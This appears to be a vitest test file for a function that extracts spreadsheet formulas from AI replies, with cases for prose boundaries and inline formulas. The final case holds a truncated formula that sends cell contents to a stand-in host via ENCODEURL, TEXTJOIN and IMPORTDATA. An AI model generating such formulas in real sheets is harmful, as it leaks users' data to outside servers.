import { expect, it } from 'vitest';
import { extractFormula } from '../src/core/aiformula.js';

// The reply reader could cut prose only after a closing parenthesis, so "=A1*2 doubles the value"
// was offered whole and, inserted, showed #NAME?; and its inline fallback wanted a function call,
// so "You can use =A1*2 in cell B1." was reported as a reply holding no formula. Prose now ends a
// formula at the first space two words follow (no formula puts two names side by side), and an
// inline formula may be a reference, name or number expression, read to the next space.
it.each([
  ['=A1*2 doubles the value', '=A1*2'],
  ['=A1:A10 is the range', '=A1:A10'],
  ['=SUM(A1:A3)*2 is double', '=SUM(A1:A3)*2'],
  ['=A1+B1 adds them.', '=A1+B1'],
  ['=A1 * 2 is double', '=A1 * 2'],
  ["='Sales Data Q1'!A1*2 is the value", "='Sales Data Q1'!A1*2"],
  ['=A1&" and "&B1 joins them', '=A1&" and "&B1'],
  ['=IF(A1>0, "big deal", "no") flags it', '=IF(A1>0, "big deal", "no")'],
  // Spaces inside a formula: an operator, a comma or a parenthesis after the word carries it on.
  ['=SUM(A1:A5) - tax * 2', '=SUM(A1:A5) - tax * 2'],
  ['=LET(a, 1, b, 2, a + b)', '=LET(a, 1, b, 2, a + b)'],
  ['=IF(A1 > 0, yes, no)', '=IF(A1 > 0, yes, no)'],
  ['=A1 & " " & B1', '=A1 & " " & B1'],
  // An inline formula that is not a function call.
  ['You can use =A1*2 in cell B1.', '=A1*2'],
  ['Put =B2*1.1 in C2 and fill down.', '=B2*1.1'],
  ['Enter =A1:A10 there.', '=A1:A10'],
  ['Try =-A1 (the negative).', '=-A1'],
  ['(use =A1*2)', '=A1*2'],
  ['Use =A1&" kg" for the label.', '=A1&" kg"'],
  ['Sum: =SUM(A1:A5), average: =AVERAGE(A1:A5).', '=SUM(A1:A5)'],
  // An equals sign of the prose is not a formula.
  ['Set A1=B1 and check', null],
  ['x = 5', null],
  ['a === b', null],
  // A formula the model cut off is still returned as it stands.
  ['=MAP("https://x.example/?d="&ENCODEURL(TEXTJOIN(",",1,A1:B1)),IMPORTDATA', '=MAP("https://x.example/?d="&ENCODEURL(TEXTJOIN(",",1,A1:B1)),IMPORTDATA'],
])('%s reads as %o', (reply, expected) => {
  expect(extractFormula(reply)).toBe(expected);
});
